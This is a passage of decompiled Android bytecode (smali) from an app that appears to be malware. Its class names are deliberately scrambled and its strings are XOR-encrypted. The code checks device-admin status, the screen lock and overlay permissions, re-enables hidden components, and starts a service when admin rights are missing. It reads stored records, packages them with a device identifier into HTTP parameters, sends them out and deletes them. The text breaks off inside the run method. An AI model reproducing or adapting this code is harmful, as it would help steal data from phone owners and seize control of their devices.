.class public Lzvy/zpfypq/bbuhtkwvaf/w;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field private static final d:[Ljava/lang/String;

.field public static i:Z


# instance fields
.field a:Z

.field b:Z

.field final synthetic c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

.field e:Z

.field private f:Landroid/content/Context;

.field g:Lzvy/zpfypq/bbuhtkwvaf/r;

.field private h:Landroid/app/admin/DevicePolicyManager;

.field private j:Landroid/content/ComponentName;

.field k:Z

.field l:Z

.field m:Z


# direct methods
.method static constructor <clinit>()V
    .locals 12

    const/16 v0, 0xd

    new-array v3, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v1, ")\t]6j\u0017%]8Y\u001f8G)"

    const/4 v0, -0x1

    move-object v4, v3

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    array-length v5, v1

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-gt v5, v7, :cond_2

    :cond_0
    move-object v7, v1

    move v8, v6

    move v11, v5

    move-object v5, v1

    move v1, v11

    :goto_1
    aget-char v10, v5, v6

    rem-int/lit8 v9, v8, 0x5

    packed-switch v9, :pswitch_data_0

    const/4 v9, 0x6

    :goto_2
    xor-int/2addr v9, v10

    int-to-char v9, v9

    aput-char v9, v5, v6

    add-int/lit8 v6, v8, 0x1

    if-nez v1, :cond_1

    move-object v5, v7

    move v8, v6

    move v6, v1

    goto :goto_1

    :cond_1
    move v5, v1

    move-object v1, v7

    :cond_2
    if-gt v5, v6, :cond_0

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v1

    packed-switch v0, :pswitch_data_1

    aput-object v1, v3, v2

    const/4 v2, 0x1

    const-string v1, "\u001d3W:s\u0017$J"

    const/4 v0, 0x0

    move-object v3, v4

    goto :goto_0

    :pswitch_0
    aput-object v1, v3, v2

    const/4 v2, 0x2

    const-string v1, "\u00175Z4i\u0018"

    const/4 v0, 0x1

    move-object v3, v4

    goto :goto_0

    :pswitch_1
    aput-object v1, v3, v2

    const/4 v2, 0x3

    const-string v1, "\u001f;K4"

    const/4 v0, 0x2

    move-object v3, v4

    goto :goto_0

    :pswitch_2
    aput-object v1, v3, v2

    const/4 v2, 0x4

    const-string v1, "\u00123X4e\u0013\t^2j\u001f5W"

    const/4 v0, 0x3

    move-object v3, v4

    goto :goto_0

    :pswitch_3
    aput-object v1, v3, v2

    const/4 v2, 0x5

    const-string v1, "\u00178J/i\u001f2\u0000\u001fI9\u0002q\u001eI;\u0006b\u0018R3\u0012"

    const/4 v0, 0x4

    move-object v3, v4

    goto :goto_0

    :pswitch_4
    aput-object v1, v3, v2

    const/4 v2, 0x6

    const-string v1, "\u00127Z<"

    const/4 v0, 0x5

    move-object v3, v4

    goto :goto_0

    :pswitch_5
    aput-object v1, v3, v2

    const/4 v2, 0x7

    const-string v1, "\u001d3W:s\u0017$J"

    const/4 v0, 0x6

    move-object v3, v4

    goto :goto_0

    :pswitch_6
    aput-object v1, v3, v2

    const/16 v2, 0x8

    const-string v1, "\u00178J/i\u001f2\u0000-t\u0019 G9c\u0004x}8r\u0002?@:u"

    const/4 v0, 0x7

    move-object v3, v4

    goto :goto_0

    :pswitch_7
    aput-object v1, v3, v2

    const/16 v2, 0x9

    const-string v1, "\u001f%m<j\u001a?@:V\u00175E<a\u0013\u0017B1i\u00013J\ti2$O*I\u00003\\1g\u000f%"

    const/16 v0, 0x8

    move-object v3, v4

    goto :goto_0

    :pswitch_8
    aput-object v1, v3, v2

    const/16 v2, 0xa

    const-string v1, "\u00178J/i\u001f2\u00004h\u00023@)(\u00175Z4i\u0018xc\u001cO8"

    const/16 v0, 0x9

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_9
    aput-object v1, v3, v2

    const/16 v2, 0xb

    const-string v1, "\u00178J/i\u001f2\u00004h\u00023@)(\u00157Z8a\u0019$WsN9\u001bk"

    const/16 v0, 0xa

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_a
    aput-object v1, v3, v2

    const/16 v2, 0xc

    const-string v1, "\u001d3W:s\u0017$J"

    const/16 v0, 0xb

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_b
    aput-object v1, v3, v2

    sput-object v4, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    return-void

    :pswitch_c
    const/16 v9, 0x76

    goto/16 :goto_2

    :pswitch_d
    const/16 v9, 0x56

    goto/16 :goto_2

    :pswitch_e
    const/16 v9, 0x2e

    goto/16 :goto_2

    :pswitch_f
    const/16 v9, 0x5d

    goto/16 :goto_2

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_c
        :pswitch_d
        :pswitch_e
        :pswitch_f
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_a
        :pswitch_b
    .end packed-switch
.end method

.method public constructor <init>(Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;Landroid/content/Context;Landroid/app/admin/DevicePolicyManager;Landroid/content/ComponentName;)V
    .locals 3

    const/4 v2, 0x0

    iput-object p1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-boolean v2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->m:Z

    iput-boolean v2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->a:Z

    iput-boolean v2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->b:Z

    iput-boolean v2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z

    iput-boolean v2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->k:Z

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/r;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/r;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->g:Lzvy/zpfypq/bbuhtkwvaf/r;

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->g:Lzvy/zpfypq/bbuhtkwvaf/r;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)Z

    move-result v0

    iput-boolean v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->l:Z

    iput-object p3, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->h:Landroid/app/admin/DevicePolicyManager;

    iput-object p2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->f:Landroid/content/Context;

    iput-object p4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->j:Landroid/content/ComponentName;

    return-void
.end method

.method private b()V
    .locals 7

    const/4 v6, 0x0

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/B;

    invoke-direct {v1, p0}, Lzvy/zpfypq/bbuhtkwvaf/B;-><init>(Lzvy/zpfypq/bbuhtkwvaf/w;)V

    const-wide/16 v2, 0x64

    const/4 v4, 0x1

    new-array v4, v4, [I

    const/16 v5, 0xc8

    aput v5, v4, v6

    aget v4, v4, v6

    int-to-long v4, v4

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->scheduleAtFixedRate(Ljava/util/TimerTask;JJ)V

    return-void
.end method

.method private b(Landroid/content/Intent;)V
    .locals 6

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lzvy/zpfypq/bbuhtkwvaf/n;

    invoke-direct {v1, p0, p1, v0}, Lzvy/zpfypq/bbuhtkwvaf/n;-><init>(Lzvy/zpfypq/bbuhtkwvaf/w;Landroid/content/Intent;Ljava/util/Timer;)V

    const-wide/16 v2, 0x64

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    iget-object v4, v4, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->c:[I

    const/4 v5, 0x0

    aget v4, v4, v5

    int-to-long v4, v4

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->scheduleAtFixedRate(Ljava/util/TimerTask;JJ)V

    return-void
.end method


# virtual methods
.method public a(Landroid/content/Context;)V
    .locals 4

    const/4 v3, 0x1

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;

    invoke-direct {v1, p1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1, v3, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method

.method public a()Z
    .locals 4

    :try_start_0
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/16 v3, 0xa

    aget-object v2, v2, v3

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/16 v3, 0xb

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x10000

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->resolveActivity(Landroid/content/Intent;I)Landroid/content/pm/ResolveInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    iget-object v0, v0, Landroid/content/pm/ActivityInfo;->packageName:Ljava/lang/String;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    :goto_0
    return v0

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_0
.end method

.method public a(Landroid/content/Context;)Z
    .locals 3

    :try_start_0
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/16 v2, 0xc

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    :goto_0
    return v0

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_0
.end method

.method public b(Landroid/content/Context;)Z
    .locals 7

    const/4 v0, 0x0

    const/4 v1, 0x1

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x17

    if-lt v2, v3, :cond_0

    :try_start_0
    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/16 v3, 0x8

    aget-object v2, v2, v3

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/16 v4, 0x9

    aget-object v3, v3, v4

    const/4 v4, 0x4

    new-array v4, v4, [Ljava/lang/Class;

    const/4 v5, 0x0

    const-class v6, Landroid/content/Context;

    aput-object v6, v4, v5

    const/4 v5, 0x1

    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v5

    const/4 v5, 0x2

    const-class v6, Ljava/lang/String;

    aput-object v6, v4, v5

    const/4 v5, 0x3

    sget-object v6, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v5

    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v3, 0x0

    const/4 v4, 0x4

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x0

    iget-object v6, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v6}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    aput-object v6, v4, v5

    const/4 v5, 0x1

    invoke-static {}, Landroid/os/Process;->myUid()I

    move-result v6

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    aput-object v6, v4, v5

    const/4 v5, 0x2

    iget-object v6, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v6}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getPackageName()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    const/4 v5, 0x3

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    aput-object v6, v4, v5

    invoke-virtual {v2, v3, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    if-eqz v2, :cond_1

    :cond_0
    move v0, v1

    :cond_1
    :goto_0
    return v0

    :catch_0
    move-exception v0

    move v0, v1

    goto :goto_0

    :catch_1
    move-exception v0

    move v0, v1

    goto :goto_0
.end method

.method public run()V
    .locals 14
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    const/high16 v13, 0x10000000

    const/4 v12, 0x0

    const/4 v11, 0x1

    sget-boolean v1, Lzvy/zpfypq/bbuhtkwvaf/s;->h:Z

    :try_start_0
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->stopSelf()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :try_start_1
    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/o;

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v2}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lzvy/zpfypq/bbuhtkwvaf/o;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/o;->a()Landroid/database/Cursor;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    move-result-object v2

    :try_start_2
    iget-object v3, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v3}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lzvy/zpfypq/bbuhtkwvaf/llllLIlLlIIllIllIlIIlLIllIlllIlLlIlIIllllIllllIIlIIIIlll;->a(Landroid/content/Context;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-result v3

    if-eqz v3, :cond_2

    :try_start_3
    iget-boolean v3, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z

    if-eqz v3, :cond_2

    sget-boolean v3, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->d:Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    if-eqz v3, :cond_2

    if-eqz v2, :cond_2

    :try_start_4
    invoke-interface {v2}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v3

    if-eqz v3, :cond_2

    :cond_1
    const/4 v3, 0x0

    invoke-interface {v2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x1

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x2

    invoke-interface {v2, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v6}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    invoke-static {v6}, Lzvy/zpfypq/bbuhtkwvaf/d;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "="

    invoke-virtual {v4, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    const/4 v7, 0x1

    aget-object v4, v4, v7

    const-string v7, "="

    invoke-virtual {v5, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    const/4 v7, 0x1

    aget-object v5, v5, v7

    new-instance v7, Ljava/util/ArrayList;

    const/4 v8, 0x3

    invoke-direct {v7, v8}, Ljava/util/ArrayList;-><init>(I)V

    new-instance v8, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v9, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/4 v10, 0x2

    aget-object v9, v9, v10

    invoke-direct {v8, v9, v4}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v8}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v8, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/4 v9, 0x3

    aget-object v8, v8, v9

    invoke-direct {v4, v8, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v6, Lzvy/zpfypq/bbuhtkwvaf/w;->d:[Ljava/lang/String;

    const/4 v8, 0x6

    aget-object v6, v6, v8

    invoke-virtual {v5}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v6, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v4}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v4, v7, v5}, Lzvy/zpfypq/bbuhtkwvaf/llllLIlLlIIllIllIlIIlLIllIlllIlLlIlIIllllIllllIIlIIIIlll;->a(Landroid/content/Context;Ljava/util/List;Z)Ljava/lang/CharSequence;

    invoke-virtual {v0, v3}, Lzvy/zpfypq/bbuhtkwvaf/o;->a(Ljava/lang/String;)Landroid/database/Cursor;

    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_1

    :cond_2
    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/o;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    :goto_0
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/s;->a:Ljava/lang/String;

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v2}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v0, v2}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->a(Ljava/lang/String;Landroid/content/Context;)Z

    move-result v0

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->h:Landroid/app/admin/DevicePolicyManager;

    iget-object v3, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->j:Landroid/content/ComponentName;

    invoke-virtual {v2, v3}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    new-instance v3, Landroid/content/Intent;

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v4}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lzvy/zpfypq/bbuhtkwvaf/IlIllllLILIlIllllIIILllIlIIllIlllllllllllllIllIIIlIIlLII;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :try_start_5
    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    iget-boolean v4, v4, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->k:Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    if-nez v4, :cond_3

    if-eqz v0, :cond_3

    :try_start_6
    iget-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_5

    if-eqz v4, :cond_3

    if-nez v2, :cond_3

    :try_start_7
    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->f:Landroid/content/Context;

    invoke-virtual {v4, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    const/4 v5, 0x1

    iput-boolean v5, v4, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->k:Z
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_7

    :cond_3
    :try_start_8
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x17

    if-lt v4, v5, :cond_f

    iget-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_8

    if-nez v4, :cond_4

    :try_start_9
    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->c:Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-virtual {v4}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {p0, v4}, Lzvy/zpfypq/bbuhtkwvaf/w;->b(Landroid/content/Context;)Z

    move-result v4

    iput-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_9

    :cond_4
    :try_start_a
    iget-boolean v4, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->e:Z

    if-nez v4, :cond_e

    iget-boolean v1, p0, Lzvy/zpfypq/bbuhtkwvaf/w;->m:Z
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_a

    if-nez v1, :cond_5

    const/4 v1, 0x1

